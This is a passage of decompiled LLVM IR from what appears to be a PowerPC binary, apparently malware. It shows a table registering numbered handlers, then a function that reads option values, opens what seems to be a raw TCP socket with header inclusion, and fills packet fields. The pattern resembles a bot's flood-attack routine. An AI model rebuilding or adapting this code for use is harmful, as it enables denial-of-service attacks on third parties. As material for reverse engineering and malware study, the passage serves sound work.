  %v2_100025ac = call i32 @function_1000c548(i32 1, i32 8)
  %v3_100025b0 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_100025b0 = zext i8 %v3_100025b0 to i32
  store i32 %v4_100025b0, i32* %r4.global-to-local, align 4
  store i32 %v2_100025ac, i32* %r28.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v3_100025c4 = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_100025c8 = inttoptr i32 %v2_100025ac to i32*
  store i32 268453268, i32* %v2_100025c8, align 4
  %v0_100025cc = load i32, i32* %r4.global-to-local, align 4
  %v1_100025cc = mul i32 %v0_100025cc, 4
  store i32 %v1_100025cc, i32* %r4.global-to-local, align 4
  %v0_100025d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100025d0 = trunc i32 %v0_100025d0 to i8
  %v2_100025d0 = load i32, i32* %r28.global-to-local, align 4
  %v3_100025d0 = add i32 %v2_100025d0, 4
  %v4_100025d0 = inttoptr i32 %v3_100025d0 to i8*
  store i8 %v1_100025d0, i8* %v4_100025d0, align 1
  %v0_100025d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100025d4 = add i32 %v0_100025d4, 4
  store i32 %v1_100025d4, i32* %r4.global-to-local, align 4
  store i32 268445148, i32* @lr, align 4
  %v3_100025d8 = call i32 @function_1000c6b8(i32 %v3_100025c4, i32 %v1_100025d4, i32 268453268)
  %v3_100025dc = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_100025dc = zext i8 %v3_100025dc to i32
  store i32 %v3_100025d8, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_100025ec = mul nuw nsw i32 %v4_100025dc, 4
  %v0_100025f0 = load i32, i32* @r28, align 4
  %v3_100025f0 = add i32 %v1_100025ec, %v3_100025d8
  %v4_100025f0 = inttoptr i32 %v3_100025f0 to i32*
  store i32 %v0_100025f0, i32* %v4_100025f0, align 4
  %v0_100025f8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100025f8, i32* @global_var_1001eb18.59, align 4
  %v0_100025fc = load i32, i32* %r0.global-to-local, align 4
  %v1_100025fc = trunc i32 %v0_100025fc to i8
  store i8 %v1_100025fc, i8* @global_var_1001eb14.58, align 1
  store i32 268445188, i32* @lr, align 4
  %v2_10002600 = call i32 @function_1000c548(i32 1, i32 8)
  %v3_10002604 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002604 = zext i8 %v3_10002604 to i32
  store i32 %v4_10002604, i32* %r4.global-to-local, align 4
  store i32 %v2_10002600, i32* %r28.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_10002618 = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_1000261c = inttoptr i32 %v2_10002600 to i32*
  store i32 268451760, i32* %v2_1000261c, align 4
  %v0_10002620 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002620 = mul i32 %v0_10002620, 4
  store i32 %v1_10002620, i32* %r4.global-to-local, align 4
  %v0_10002624 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002624 = trunc i32 %v0_10002624 to i8
  %v2_10002624 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002624 = add i32 %v2_10002624, 4
  %v4_10002624 = inttoptr i32 %v3_10002624 to i8*
  store i8 %v1_10002624, i8* %v4_10002624, align 1
  %v0_10002628 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002628 = add i32 %v0_10002628, 4
  store i32 %v1_10002628, i32* %r4.global-to-local, align 4
  store i32 268445232, i32* @lr, align 4
  %v3_1000262c = call i32 @function_1000c6b8(i32 %v3_10002618, i32 %v1_10002628, i32 268451760)
  %v3_10002630 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002630 = zext i8 %v3_10002630 to i32
  store i32 %v3_1000262c, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_10002640 = mul nuw nsw i32 %v4_10002630, 4
  %v0_10002644 = load i32, i32* @r28, align 4
  %v3_10002644 = add i32 %v1_10002640, %v3_1000262c
  %v4_10002644 = inttoptr i32 %v3_10002644 to i32*
  store i32 %v0_10002644, i32* %v4_10002644, align 4
  %v0_1000264c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000264c, i32* @global_var_1001eb18.59, align 4
  %v0_10002650 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002650 = trunc i32 %v0_10002650 to i8
  store i8 %v1_10002650, i8* @global_var_1001eb14.58, align 1
  store i32 268445272, i32* @lr, align 4
  %v2_10002654 = call i32 @function_1000c548(i32 1, i32 8)
  %v3_10002658 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002658 = zext i8 %v3_10002658 to i32
  store i32 %v4_10002658, i32* %r4.global-to-local, align 4
  store i32 %v2_10002654, i32* %r28.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_1000266c = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_10002670 = inttoptr i32 %v2_10002654 to i32*
  store i32 268448544, i32* %v2_10002670, align 4
  %v0_10002674 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002674 = mul i32 %v0_10002674, 4
  store i32 %v1_10002674, i32* %r4.global-to-local, align 4
  %v0_10002678 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002678 = trunc i32 %v0_10002678 to i8
  %v2_10002678 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002678 = add i32 %v2_10002678, 4
  %v4_10002678 = inttoptr i32 %v3_10002678 to i8*
  store i8 %v1_10002678, i8* %v4_10002678, align 1
  %v0_1000267c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000267c = add i32 %v0_1000267c, 4
  store i32 %v1_1000267c, i32* %r4.global-to-local, align 4
  store i32 268445316, i32* @lr, align 4
  %v3_10002680 = call i32 @function_1000c6b8(i32 %v3_1000266c, i32 %v1_1000267c, i32 268448544)
  %v3_10002684 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002684 = zext i8 %v3_10002684 to i32
  store i32 %v3_10002680, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_10002694 = mul nuw nsw i32 %v4_10002684, 4
  %v0_10002698 = load i32, i32* @r28, align 4
  %v3_10002698 = add i32 %v1_10002694, %v3_10002680
  %v4_10002698 = inttoptr i32 %v3_10002698 to i32*
  store i32 %v0_10002698, i32* %v4_10002698, align 4
  %v0_100026a0 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100026a0, i32* @global_var_1001eb18.59, align 4
  %v0_100026a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100026a4 = trunc i32 %v0_100026a4 to i8
  store i8 %v1_100026a4, i8* @global_var_1001eb14.58, align 1
  store i32 268445356, i32* @lr, align 4
  %v2_100026a8 = call i32 @function_1000c548(i32 1, i32 8)
  %v3_100026ac = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_100026ac = zext i8 %v3_100026ac to i32
  store i32 %v4_100026ac, i32* %r4.global-to-local, align 4
  store i32 %v2_100026a8, i32* %r28.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v3_100026c0 = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_100026c4 = inttoptr i32 %v2_100026a8 to i32*
  store i32 268450152, i32* %v2_100026c4, align 4
  %v0_100026c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100026c8 = mul i32 %v0_100026c8, 4
  store i32 %v1_100026c8, i32* %r4.global-to-local, align 4
  %v0_100026cc = load i32, i32* %r0.global-to-local, align 4
  %v1_100026cc = trunc i32 %v0_100026cc to i8
  %v2_100026cc = load i32, i32* %r28.global-to-local, align 4
  %v3_100026cc = add i32 %v2_100026cc, 4
  %v4_100026cc = inttoptr i32 %v3_100026cc to i8*
  store i8 %v1_100026cc, i8* %v4_100026cc, align 1
  %v0_100026d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100026d0 = add i32 %v0_100026d0, 4
  store i32 %v1_100026d0, i32* %r4.global-to-local, align 4
  store i32 268445400, i32* @lr, align 4
  %v3_100026d4 = call i32 @function_1000c6b8(i32 %v3_100026c0, i32 %v1_100026d0, i32 268450152)
  %v3_100026d8 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_100026d8 = zext i8 %v3_100026d8 to i32
  store i32 %v3_100026d4, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_100026e8 = mul nuw nsw i32 %v4_100026d8, 4
  %v0_100026ec = load i32, i32* @r28, align 4
  %v3_100026ec = add i32 %v1_100026e8, %v3_100026d4
  %v4_100026ec = inttoptr i32 %v3_100026ec to i32*
  store i32 %v0_100026ec, i32* %v4_100026ec, align 4
  %v0_100026f4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100026f4, i32* @global_var_1001eb18.59, align 4
  %v0_100026f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100026f8 = trunc i32 %v0_100026f8 to i8
  store i8 %v1_100026f8, i8* @global_var_1001eb14.58, align 1
  store i32 268445440, i32* @lr, align 4
  %v2_100026fc = call i32 @function_1000c548(i32 1, i32 8)
  %v3_10002700 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002700 = zext i8 %v3_10002700 to i32
  store i32 %v4_10002700, i32* %r4.global-to-local, align 4
  store i32 %v2_100026fc, i32* %r28.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_10002714 = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_10002718 = inttoptr i32 %v2_100026fc to i32*
  store i32 268447180, i32* %v2_10002718, align 4
  %v0_1000271c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000271c = mul i32 %v0_1000271c, 4
  store i32 %v1_1000271c, i32* %r4.global-to-local, align 4
  %v0_10002720 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002720 = trunc i32 %v0_10002720 to i8
  %v2_10002720 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002720 = add i32 %v2_10002720, 4
  %v4_10002720 = inttoptr i32 %v3_10002720 to i8*
  store i8 %v1_10002720, i8* %v4_10002720, align 1
  %v0_10002724 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002724 = add i32 %v0_10002724, 4
  store i32 %v1_10002724, i32* %r4.global-to-local, align 4
  store i32 268445484, i32* @lr, align 4
  %v3_10002728 = call i32 @function_1000c6b8(i32 %v3_10002714, i32 %v1_10002724, i32 268447180)
  %v3_1000272c = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_1000272c = zext i8 %v3_1000272c to i32
  store i32 %v3_10002728, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_1000273c = mul nuw nsw i32 %v4_1000272c, 4
  %v0_10002740 = load i32, i32* @r28, align 4
  %v3_10002740 = add i32 %v1_1000273c, %v3_10002728
  %v4_10002740 = inttoptr i32 %v3_10002740 to i32*
  store i32 %v0_10002740, i32* %v4_10002740, align 4
  %v0_10002748 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10002748, i32* @global_var_1001eb18.59, align 4
  %v0_1000274c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000274c = trunc i32 %v0_1000274c to i8
  store i8 %v1_1000274c, i8* @global_var_1001eb14.58, align 1
  store i32 268445524, i32* @lr, align 4
  %v2_10002750 = call i32 @function_1000c548(i32 1, i32 8)
  %v3_10002754 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002754 = zext i8 %v3_10002754 to i32
  store i32 %v4_10002754, i32* %r4.global-to-local, align 4
  store i32 %v2_10002750, i32* %r28.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_10002768 = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_1000276c = inttoptr i32 %v2_10002750 to i32*
  store i32 268445708, i32* %v2_1000276c, align 4
  %v0_10002770 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002770 = mul i32 %v0_10002770, 4
  store i32 %v1_10002770, i32* %r4.global-to-local, align 4
  %v0_10002774 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002774 = trunc i32 %v0_10002774 to i8
  %v2_10002774 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002774 = add i32 %v2_10002774, 4
  %v4_10002774 = inttoptr i32 %v3_10002774 to i8*
  store i8 %v1_10002774, i8* %v4_10002774, align 1
  %v0_10002778 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002778 = add i32 %v0_10002778, 4
  store i32 %v1_10002778, i32* %r4.global-to-local, align 4
  store i32 268445568, i32* @lr, align 4
  %v3_1000277c = call i32 @function_1000c6b8(i32 %v3_10002768, i32 %v1_10002778, i32 268445708)
  %v3_10002780 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002780 = zext i8 %v3_10002780 to i32
  store i32 %v3_1000277c, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_10002790 = mul nuw nsw i32 %v4_10002780, 4
  %v0_10002794 = load i32, i32* @r28, align 4
  %v3_10002794 = add i32 %v1_10002790, %v3_1000277c
  %v4_10002794 = inttoptr i32 %v3_10002794 to i32*
  store i32 %v0_10002794, i32* %v4_10002794, align 4
  %v0_1000279c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000279c = trunc i32 %v0_1000279c to i8
  store i8 %v1_1000279c, i8* @global_var_1001eb14.58, align 1
  %v0_100027a0 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100027a0, i32* @global_var_1001eb18.59, align 4
  store i32 268445608, i32* @lr, align 4
  %v2_100027a4 = call i32 @function_1000c548(i32 1, i32 8)
  %v3_100027a8 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_100027a8 = zext i8 %v3_100027a8 to i32
  store i32 %v4_100027a8, i32* %r4.global-to-local, align 4
  store i32 %v2_100027a4, i32* %r28.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_100027bc = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_100027c0 = inttoptr i32 %v2_100027a4 to i32*
  store i32 268436024, i32* %v2_100027c0, align 4
  %v0_100027c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100027c4 = mul i32 %v0_100027c4, 4
  store i32 %v1_100027c4, i32* %r4.global-to-local, align 4
  %v0_100027c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100027c8 = trunc i32 %v0_100027c8 to i8
  %v2_100027c8 = load i32, i32* %r28.global-to-local, align 4
  %v3_100027c8 = add i32 %v2_100027c8, 4
  %v4_100027c8 = inttoptr i32 %v3_100027c8 to i8*
  store i8 %v1_100027c8, i8* %v4_100027c8, align 1
  %v0_100027cc = load i32, i32* %r4.global-to-local, align 4
  %v1_100027cc = add i32 %v0_100027cc, 4
  store i32 %v1_100027cc, i32* %r4.global-to-local, align 4
  store i32 268445652, i32* @lr, align 4
  %v3_100027d0 = call i32 @function_1000c6b8(i32 %v3_100027bc, i32 %v1_100027cc, i32 268436024)
  %v3_100027d4 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_100027d4 = zext i8 %v3_100027d4 to i32
  store i32 %v3_100027d0, i32* @global_var_1001eb18.59, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_100027e0 = mul nuw nsw i32 %v4_100027d4, 4
  %v0_100027e4 = load i32, i32* @r28, align 4
  %v3_100027e4 = add i32 %v1_100027e0, %v3_100027d0
  %v4_100027e4 = inttoptr i32 %v3_100027e4 to i32*
  store i32 %v0_100027e4, i32* %v4_100027e4, align 4
  %v0_100027ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100027ec = trunc i32 %v0_100027ec to i8
  store i8 %v1_100027ec, i8* @global_var_1001eb14.58, align 1
  store i32 %v0_100023e4, i32* %r0.global-to-local, align 4
  store i32 %v0_10002400, i32* @r28, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_1001eb14.58, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_1000280c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000280c:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-90 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_10002810 = load i32, i32* @lr, align 4
  store i32 %v0_10002810, i32* %r0.global-to-local, align 4
  %v0_10002814 = call i32 @__asm_mfcr()
  store i32 %v0_10002814, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r25.global-to-local, align 4
  %v0_10002824 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10002814, i32* %r18.global-to-local, align 4
  %v0_10002858 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10002860 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_10002868 = load i32, i32* @r30, align 4
  %v0_1000286c = load i32, i32* @r31, align 4
  store i32 268445824, i32* @lr, align 4
  %v2_1000287c = call i32 @function_1000c548(i32 4, i32 4)
  store i32 %v2_1000287c, i32* %r19.global-to-local, align 4
  %v0_10002884 = load i32, i32* @r28, align 4
  %v0_10002890 = load i32, i32* @r29, align 4
  store i32 %v0_10002890, i32* %r3.global-to-local, align 4
  store i32 268445848, i32* @lr, align 4
  %v4_10002894 = inttoptr i32 %v0_10002884 to i32*
  %v5_10002894 = call i32 @function_1000235c(i32 %v0_10002890, i32* %v4_10002894, i32 2, i32 0)
  %v0_100028a4 = load i32, i32* @r28, align 4
  %v1_100028a8 = urem i32 %v5_10002894, 256
  store i32 %v1_100028a8, i32* %r14.global-to-local, align 4
  %v0_100028ac = load i32, i32* @r29, align 4
  store i32 %v0_100028ac, i32* %r3.global-to-local, align 4
  store i32 268445876, i32* @lr, align 4
  %v4_100028b0 = inttoptr i32 %v0_100028a4 to i32*
  %v5_100028b0 = call i32 @function_1000235c(i32 %v0_100028ac, i32* %v4_100028b0, i32 3, i32 65535)
  %v0_100028b4 = load i32, i32* @r28, align 4
  store i32 %v5_100028b0, i32* %r24.global-to-local, align 4
  %v0_100028c4 = load i32, i32* @r29, align 4
  store i32 %v0_100028c4, i32* %r3.global-to-local, align 4
  store i32 268445900, i32* @lr, align 4
  %v4_100028c8 = inttoptr i32 %v0_100028b4 to i32*
  %v5_100028c8 = call i32 @function_1000235c(i32 %v0_100028c4, i32* %v4_100028c8, i32 4, i32 64)
  %v0_100028cc = load i32, i32* @r28, align 4
  %v1_100028d8 = urem i32 %v5_100028c8, 256
  store i32 %v1_100028d8, i32* %r20.global-to-local, align 4
  %v0_100028dc = load i32, i32* @r29, align 4
  store i32 %v0_100028dc, i32* %r3.global-to-local, align 4
  store i32 268445924, i32* @lr, align 4
  %v4_100028e0 = inttoptr i32 %v0_100028cc to i32*
  %v5_100028e0 = call i32 @function_1000235c(i32 %v0_100028dc, i32* %v4_100028e0, i32 5, i32 1)
  %v0_100028f0 = load i32, i32* @r28, align 4
  %v1_100028f4 = urem i32 %v5_100028e0, 256
  store i32 %v1_100028f4, i32* @r31, align 4
  %v0_100028f8 = load i32, i32* @r29, align 4
  store i32 %v0_100028f8, i32* %r3.global-to-local, align 4
  store i32 268445952, i32* @lr, align 4
  %v4_100028fc = inttoptr i32 %v0_100028f0 to i32*
  %v5_100028fc = call i32 @function_1000235c(i32 %v0_100028f8, i32* %v4_100028fc, i32 6, i32 65535)
  %v0_10002904 = load i32, i32* @r28, align 4
  store i32 %v5_100028fc, i32* %r26.global-to-local, align 4
  %v0_10002914 = load i32, i32* @r29, align 4
  store i32 %v0_10002914, i32* %r3.global-to-local, align 4
  store i32 268445980, i32* @lr, align 4
  %v4_10002918 = inttoptr i32 %v0_10002904 to i32*
  %v5_10002918 = call i32 @function_1000235c(i32 %v0_10002914, i32* %v4_10002918, i32 7, i32 65535)
  %v0_1000291c = load i32, i32* @r28, align 4
  store i32 %v5_10002918, i32* %r27.global-to-local, align 4
  %v0_1000292c = load i32, i32* @r29, align 4
  store i32 %v0_1000292c, i32* %r3.global-to-local, align 4
  store i32 268446004, i32* @lr, align 4
  %v4_10002930 = inttoptr i32 %v0_1000291c to i32*
  %v5_10002930 = call i32 @function_1000235c(i32 %v0_1000292c, i32* %v4_10002930, i32 0, i32 512)
  %v0_10002934 = load i32, i32* @r28, align 4
  store i32 %v5_10002930, i32* %r15.global-to-local, align 4
  %v0_10002944 = load i32, i32* @r29, align 4
  store i32 %v0_10002944, i32* %r3.global-to-local, align 4
  store i32 268446028, i32* @lr, align 4
  %v4_10002948 = inttoptr i32 %v0_10002934 to i32*
  %v5_10002948 = call i32 @function_1000235c(i32 %v0_10002944, i32* %v4_10002948, i32 1, i32 1)
  %v0_1000294c = load i32, i32* @r28, align 4
  %v1_10002958 = urem i32 %v5_10002948, 256
  store i32 %v1_10002958, i32* %r21.global-to-local, align 4
  %v0_1000295c = load i32, i32* @r29, align 4
  store i32 %v0_1000295c, i32* %r3.global-to-local, align 4
  store i32 268446052, i32* @lr, align 4
  %v4_10002960 = inttoptr i32 %v0_1000294c to i32*
  %v5_10002960 = call i32 @function_1000235c(i32 %v0_1000295c, i32* %v4_10002960, i32 19, i32 0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10002968 = load i32, i32* @global_var_1001eb10.71, align 4
  %v0_1000296c = load i32, i32* @r28, align 4
  store i32 %v5_10002960, i32* %r30.global-to-local, align 4
  %v0_10002978 = load i32, i32* @r29, align 4
  store i32 %v0_10002978, i32* %r3.global-to-local, align 4
  store i32 268446080, i32* @lr, align 4
  %v4_1000297c = inttoptr i32 %v0_1000296c to i32*
  %v5_1000297c = call i32 @function_1000235c(i32 %v0_10002978, i32* %v4_1000297c, i32 25, i32 %v3_10002968)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268446100, i32* @lr, align 4
  %v3_10002990 = call i32 @function_1000c1bc(i32 2, i32 3, i32 6)
  store i32 %v3_10002990, i32* %r3.global-to-local, align 4
  %v3_10002994 = icmp eq i32 %v3_10002990, -1
  store i1 %v3_10002994, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10002990, i32* %r23.global-to-local, align 4
  br i1 %v3_10002994, label %dec_label_pc_10002b38, label %dec_label_pc_100029a0

dec_label_pc_100029a0:                            ; preds = %dec_label_pc_1000280c
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100029ac = ptrtoint i32* %stack_var_-104 to i32
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268446140, i32* @lr, align 4
  %v5_100029b8 = call i32 @function_1000c180(i32 0, i32 3, i32 %v2_100029ac, i32 4, i32 4)
  store i32 %v5_100029b8, i32* %r3.global-to-local, align 4
  %v3_100029bc = icmp eq i32 %v5_100029b8, -1
  store i1 %v3_100029bc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100029bc, label %dec_label_pc_10002b30, label %dec_label_pc_100029c4

dec_label_pc_100029c4:                            ; preds = %dec_label_pc_100029a0
  %v0_100029c4 = load i32, i32* %r18.global-to-local, align 4
  %v1_100029c4 = icmp slt i32 %v0_100029c4, 0
  %v3_100029c4 = icmp eq i32 %v0_100029c4, 0
  store i1 %v1_100029c4, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_100029c4, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  %v0_100029d0 = load i32, i32* %r24.global-to-local, align 4
  %v1_100029d0 = urem i32 %v0_100029d0, 65536
  store i32 %v1_100029d0, i32* %r24.global-to-local, align 4
  %v0_100029d4 = load i32, i32* %r26.global-to-local, align 4
  %v1_100029d4 = urem i32 %v0_100029d4, 65536
  store i32 %v1_100029d4, i32* %r16.global-to-local, align 4
  %v0_100029d8 = load i32, i32* %r27.global-to-local, align 4
  %v1_100029d8 = urem i32 %v0_100029d8, 65536
  store i32 %v1_100029d8, i32* %r17.global-to-local, align 4
  %v0_100029dc = load i32, i32* %r30.global-to-local, align 4
  %v1_100029dc = urem i32 %v0_100029dc, 256
  store i32 %v1_100029dc, i32* %r3.global-to-local, align 4
  %tmp37 = icmp slt i32 %v0_100029c4, 1
  br i1 %tmp37, label %dec_label_pc_10002b98, label %dec_label_pc_100029e4

dec_label_pc_100029e4:                            ; preds = %dec_label_pc_100029c4
  %v0_100029e4 = load i32, i32* @r31, align 4
  %v3_100029e4 = icmp eq i32 %v0_100029e4, 0
  store i1 %v3_100029e4, i1* %cr2_eq.global-to-local, align 1
  %v3_100029e8 = icmp eq i32 %v1_100029dc, 0
  store i1 %v3_100029e8, i1* %cr3_eq.global-to-local, align 1
  %v0_100029ec = load i32, i32* %r15.global-to-local, align 4
  %v1_100029ec = urem i32 %v0_100029ec, 65536
  %v0_100029d0.not = or i32 %v0_100029d0, -65536
  %v1_100029f0 = xor i32 %v0_100029d0.not, 65535
  store i32 %v1_100029f0, i32* %r11.global-to-local, align 4
  %v1_100029f8 = add nuw nsw i32 %v1_100029ec, 66
  store i32 %v1_100029f8, i32* %r0.global-to-local, align 4
  %v1_100029fc = add nuw nsw i32 %v1_100029ec, 28
  store i32 %v1_100029fc, i32* %r9.global-to-local, align 4
  %fold = add i32 %v0_100029ec, 66
  %v1_10002a00 = urem i32 %fold, 65536
  store i32 %v1_10002a00, i32* %r22.global-to-local, align 4
  %fold8 = add i32 %v0_100029ec, 28
  %v1_10002a04 = urem i32 %fold8, 65536
  store i32 %v1_10002a04, i32* %r26.global-to-local, align 4
  %v1_10002a08 = urem i32 %v1_100029f0, 65536
  store i32 %v1_10002a08, i32* %r27.global-to-local, align 4
  %fold9 = add i32 %v0_100029ec, 8
  %v1_10002a0c = urem i32 %fold9, 65536
  store i32 %v1_10002a0c, i32* @r28, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002a40

dec_label_pc_10002a18:                            ; preds = %dec_label_pc_10002b0c
  %v0_10002a18 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002a18 = add i32 %v0_10002a18, 16
  %v2_10002a18 = inttoptr i32 %v1_10002a18 to i32*
  %v3_10002a18 = load i32, i32* %v2_10002a18, align 4
  store i32 %v3_10002a18, i32* %r0.global-to-local, align 4
  %v1_10002a1c = load i32, i32* %r30.global-to-local, align 4
  %v2_10002a1c = add i32 %v1_10002a1c, 16
  %v3_10002a1c = inttoptr i32 %v2_10002a1c to i32*
  store i32 %v3_10002a18, i32* %v3_10002a1c, align 4
  br label %dec_label_pc_10002a20

dec_label_pc_10002a20:                            ; preds = %dec_label_pc_10002b28, %dec_label_pc_10002a18
  %v3_10002a20 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002a20, i32* %r9.global-to-local, align 4
  %v0_10002a24 = load i32, i32* @r28, align 4
  %v1_10002a24 = trunc i32 %v0_10002a24 to i16
  %v2_10002a24 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002a24 = add i32 %v2_10002a24, 4
  %v4_10002a24 = inttoptr i32 %v3_10002a24 to i16*
  store i16 %v1_10002a24, i16* %v4_10002a24, align 2
  %v0_10002a28 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002a28 = add i32 %v0_10002a28, 1
  store i32 %v1_10002a28, i32* %r31.global-to-local, align 4
  %v0_10002a2c = load i32, i32* %r16.global-to-local, align 4
  %v1_10002a2c = trunc i32 %v0_10002a2c to i16
  %v2_10002a2c = load i32, i32* %r29.global-to-local, align 4
  %v3_10002a2c = inttoptr i32 %v2_10002a2c to i16*
